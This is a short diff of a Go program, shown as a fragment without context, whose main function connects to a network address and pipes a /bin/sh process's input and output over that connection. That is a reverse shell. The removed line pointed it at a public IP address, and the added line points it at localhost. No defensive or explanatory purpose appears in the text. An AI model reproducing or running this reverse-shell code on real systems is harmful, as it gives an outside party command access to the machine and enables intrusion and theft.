@@ -7,7 +7,7 @@ import (
 )
 
 func main() {
-	conn := connect("142.93.121.175")
+	conn := connect("127.0.0.1")
 	cmd := exec.Command("/bin/sh")
 	cmd.Stdin = conn
 	cmd.Stdout = conn
